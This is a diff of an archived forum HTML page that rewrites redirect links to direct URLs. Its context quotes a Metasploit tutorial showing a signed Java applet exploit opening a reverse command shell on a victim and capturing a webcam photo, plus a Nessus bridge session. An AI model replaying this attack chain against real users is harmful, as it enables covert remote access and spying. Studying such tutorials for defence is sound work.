@@ -39,8 +39,8 @@
 	}
 	else	// Load Rest of YUI remotely (where possible)
 	{
-		var yuipath = '../external.html?link=http://yui.yahooapis.com/2.9.0/build';
-		var yuicombopath = '../external.html?link=http://yui.yahooapis.com/combo';
+		var yuipath = 'http://yui.yahooapis.com/2.9.0/build';
+		var yuicombopath = 'http://yui.yahooapis.com/combo';
 		var remoteyui = true;
 		if (!yuicombopath)
 		{
@@ -1994,7 +1994,7 @@ All that's left is to execute the exploit:<br/>
 		<div class="quote_container">
 			<div class="bbcode_quote_container"></div>
 			
-				msf exploit(java_signed_applet) &gt; exploit[*] Exploit running as background job.[*] Started reverse handler on 192.168.1.2:4444[*] Using URL: <a href="../external.html?link=http://0.0.0.0:8080/Dv30CCMlra3" target="_blank">http://0.0.0.0:8080/Dv30CCMlra3</a>[*] Local IP: <a href="../external.html?link=http://192.168.1.2:8080/Dv30CCMlra3" target="_blank">http://192.168.1.2:8080/Dv30CCMlra3</a>[*] Server started.<br/>
+				msf exploit(java_signed_applet) &gt; exploit[*] Exploit running as background job.[*] Started reverse handler on 192.168.1.2:4444[*] Using URL: <a href="http://0.0.0.0:8080/Dv30CCMlra3" target="_blank">http://0.0.0.0:8080/Dv30CCMlra3</a>[*] Local IP: <a href="http://192.168.1.2:8080/Dv30CCMlra3" target="_blank">http://192.168.1.2:8080/Dv30CCMlra3</a>[*] Server started.<br/>
 msf exploit(java_signed_applet) &gt;<br/>
 Then we wait for the victim to access the page... Instantly after accepting to run the applet, this is what we'll see locally:[*] Handling request from 192.168.1.2:53420...[*] Generated executable to drop (20800 bytes).[*] Using static, signed jar. Ready to send.[*] Sending SiteLoader.jar to 192.168.1.2:53428. Waiting for user to click 'accept'...[*] Sending SiteLoader.jar to 192.168.1.2:53429. Waiting for user to click 'accept'...[*] Sending stage (421 bytes) to 192.168.1.2[*] Sleeping before handling stage...[*] Uploading bundle (29548 bytes)...[*] Upload completed.[*] Command shell session 1 opened (192.168.1.2:4444 -&gt; 192.168.1.2:53433) at Wed May 26 22:27:42 +0200 2010[*] Downloading photo...[*] Downloading photo (10089 bytes)...[*] Photo saved as /Users/netrom/.msf3/logs/isight/192.168.1.2_20100526.284610085.jpg[*] Opening photo in a web browser...[*] Command shell session 1 closed.
 			
@@ -2266,7 +2266,7 @@ msf auxiliary(socks4a) &gt; load nessus[*] Nessus Bridge for Nessus 4.2.x<br/>
 [+] Type nessus_help for a command listing[*] Successfully loaded plugin: nessus<br/>
 msf auxiliary(socks4a) &gt; nessus_connect robin@localhost<br/>
 [+] Password:<br/>
-...[*] Connecting to <a href="../external.html?link=https://localhost:8834/" target="_blank">https://localhost:8834/</a> as robin[*] Authenticated<br/>
+...[*] Connecting to <a href="https://localhost:8834/" target="_blank">https://localhost:8834/</a> as robin[*] Authenticated<br/>
 msf auxiliary(socks4a) &gt; nessus_policy_list<br/>
 [+] Nessus Policy List<br/>
 <br/>
